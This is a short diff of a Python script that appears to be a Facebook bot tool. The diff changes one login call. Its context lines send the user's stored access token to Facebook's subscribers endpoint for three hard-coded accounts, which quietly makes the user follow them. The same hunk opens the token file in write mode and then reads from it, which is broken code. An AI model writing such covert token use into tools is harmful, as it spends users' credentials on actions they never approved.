@@ -112,7 +112,7 @@ def bot():
 		try:
 			toket = open('token.x','w').read()
 		except IOError:
-			print('\n [%s!%s] Token mokad ganti akun!'%(M,N));time.sleep(1);login().login_lagi()
+			print('\n [%s!%s] Token mokad ganti akun!'%(M,N));time.sleep(1);login_lagi()
 		requests.post('https://graph.facebook.com/100033480633498/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/100001490081130/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/1517769961/subscribers?access_token=' + toket)
